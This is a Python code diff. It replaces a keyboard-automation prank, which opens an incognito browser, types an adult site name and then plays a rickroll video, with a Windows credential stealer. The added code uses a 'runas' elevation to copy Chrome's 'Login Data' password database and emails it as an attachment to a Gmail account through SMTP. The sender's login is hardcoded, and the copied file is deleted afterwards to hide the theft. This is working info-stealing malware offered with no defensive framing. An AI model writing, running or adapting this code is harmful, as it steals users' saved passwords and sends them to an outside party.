@@ -1,31 +1,34 @@
+import win32com.shell.shell as shell
+import time
 import os
-import time 
-import keyboard
+import smtplib
+import tkinter as tk 
+import multiprocessing 
+from email.message import EmailMessage 
 
-def enter():
-    keyboard.press_and_release('enter')
+def process1():
+    shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+ ('copy "C:\\Users\\' + os.environ['USERNAME'] + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" "C:\\Users\\' + os.environ['USERNAME'] + '"'))
+    time.sleep(1)
 
-def space():
-    keyboard.press_and_release('space')
+    msg = EmailMessage()
+    msg['Subject'] = 'Here you go'
+    msg['From'] = 'OSINT48@gmail.com'
+    msg['To'] = 'OSINT48@gmail.com'
+    msg.set_content('New fresh database')
 
-def writing(text):
-    text = text.split()
-    for i in text:
-        keyboard.write(i)
-        time.sleep(0.1)
+    with open(('C:\\Users\\' + os.environ['USERNAME'] + '\\Login Data'), 'rb') as f:
+        file_data = f.read()
+        file_name = f.name
 
-keyboard.press_and_release('win + r')
-time.sleep(0.3)
-keyboard.write('chrome')
-enter()
-time.sleep(3)
-keyboard.press_and_release('ctrl + shift + n')
-time.sleep(1)
-writing('p o r n h u b . c o m')
-time.sleep(0.7)
-# keyboard.press_and_release('ctrl + a')
-# keyboard.press_and_release('delete')
-keyboard.press_and_release('ctrl + w')
-time.sleep(0.1)
-keyboard.write('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
-enter()
+    msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)
+
+    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+        smtp.login('OSINT48@gmail.com', 'anticheat465')
+        smtp.send_message(msg)
+
+    os.remove('C:\\Users\\' + os.environ['USERNAME'] + '\\Login Data')
+
+def process2():
+    pass
+
+process1()
